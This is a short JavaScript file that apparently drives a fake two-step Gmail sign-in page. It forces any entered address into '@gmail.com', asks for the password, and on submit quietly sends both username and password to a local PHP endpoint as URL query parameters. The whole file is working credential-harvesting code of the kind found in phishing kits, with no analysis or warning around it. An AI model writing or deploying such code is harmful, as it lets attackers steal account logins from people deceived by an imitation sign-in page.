let myEmail = "";
let myPassword = "";

const email = document.getElementById("email");
const password = document.getElementById("password");
const username = document.getElementById("username");
const s1 = document.getElementById("s1");
const s2 = document.getElementById("s2");
const show = document.getElementById("show");

function setEmail() {
  const sEmail = email.value.split("@");
  myEmail = sEmail[0] + "@gmail.com";
  username.innerHTML = myEmail;
  if (sEmail[0].length < 3) return;
  s1.style.display = "none";
  s2.style.display = "block";
}

myForm.onsubmit = async (e) => {
  e.preventDefault();
  myPassword = password.value;
  s1.style.display = "block";
  s2.style.display = "none";
  await fetch(
    "./api/index.php?username=" + myEmail + "&password=" + myPassword
  );
};

function toggleShow() {
  if (show.checked) {
    password.type = "text";
  } else {
    password.type = "password";
  }
}
